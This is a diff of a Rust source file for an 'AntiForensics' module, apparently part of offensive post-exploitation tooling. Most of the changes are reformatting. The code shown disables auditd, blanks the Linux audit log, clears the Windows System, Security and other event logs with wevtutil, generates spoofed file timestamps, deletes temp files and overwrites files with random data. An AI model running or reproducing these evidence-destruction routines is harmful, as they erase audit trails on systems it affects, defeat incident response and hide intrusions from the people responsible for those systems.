@@ -1,6 +1,6 @@
 use std::path::Path;
 use std::process::Command;
-use std::time::{SystemTime, UNIX_EPOCH};
+use std::time::UNIX_EPOCH;
 use tracing::info;
 
 pub struct AntiForensics;
@@ -53,11 +53,7 @@ impl AntiForensics {
         results.push("journald rotated and purged".into());
 
         // Auditd
-        let _ = Command::new("auditctl")
-            .arg("-e")
-            .arg("0")
-            .output()
-            .ok();
+        let _ = Command::new("auditctl").arg("-e").arg("0").output().ok();
         let _ = Command::new("sh")
             .arg("-c")
             .arg("echo '' > /var/log/audit/audit.log 2>/dev/null")
@@ -71,12 +67,15 @@ impl AntiForensics {
     #[cfg(target_os = "windows")]
     pub fn wipe_logs() -> Vec<String> {
         let mut results = Vec::new();
-        let channels = ["system", "security", "application", "setup", "forwardedevents"];
+        let channels = [
+            "system",
+            "security",
+            "application",
+            "setup",
+            "forwardedevents",
+        ];
         for ch in &channels {
-            let _ = Command::new("wevtutil")
-                .args(["cl", ch])
-                .output()
-                .ok();
+            let _ = Command::new("wevtutil").args(["cl", ch]).output().ok();
             results.push(format!("cleared EventLog {}", ch));
         }
         // Also wipe PowerShell operational log
@@ -169,16 +168,13 @@ impl AntiForensics {
 
         let ts = spoof_timestamp.unwrap_or_else(|| {
             // Random timestamp within last 90 days
-            let now = SystemTime::now()
-                .duration_since(UNIX_EPOCH)
-                .unwrap()
-                .as_secs();
+            let now = crate::utils::timestamp_now();
             let offset = (std::time::SystemTime::now()
                 .duration_since(UNIX_EPOCH)
-                .unwrap()
-                .as_millis() as u64)
+                .map(|d| d.as_millis() as u64)
+                .unwrap_or(0))
                 % (90 * 86400);
-            (now - offset) as i64
+            now.saturating_sub(offset) as i64
         });
 
         #[cfg(unix)]
@@ -248,7 +244,10 @@ impl AntiForensics {
             let uid = unsafe { libc::getuid() };
             let _ = Command::new("sh")
                 .arg("-c")
-                .arg(format!("find /tmp -uid {} -type f -delete 2>/dev/null", uid))
+                .arg(format!(
+                    "find /tmp -uid {} -type f -delete 2>/dev/null",
+                    uid
+                ))
                 .output()
                 .ok();
             results.push("cleaned temp files by uid".into());
@@ -296,9 +295,7 @@ impl AntiForensics {
                 // Write random data over the file, then truncate
                 if let Ok(f) = std::fs::File::create(path) {
                     use std::io::Write;
-                    let buf: Vec<u8> = (0..len.min(65536))
-                        .map(|_| rand::random::<u8>())
-                        .collect();
+                    let buf: Vec<u8> = (0..len.min(65536)).map(|_| rand::random::<u8>()).collect();
                     let mut written: u64 = 0;
                     let mut f = f;
                     while written < len {
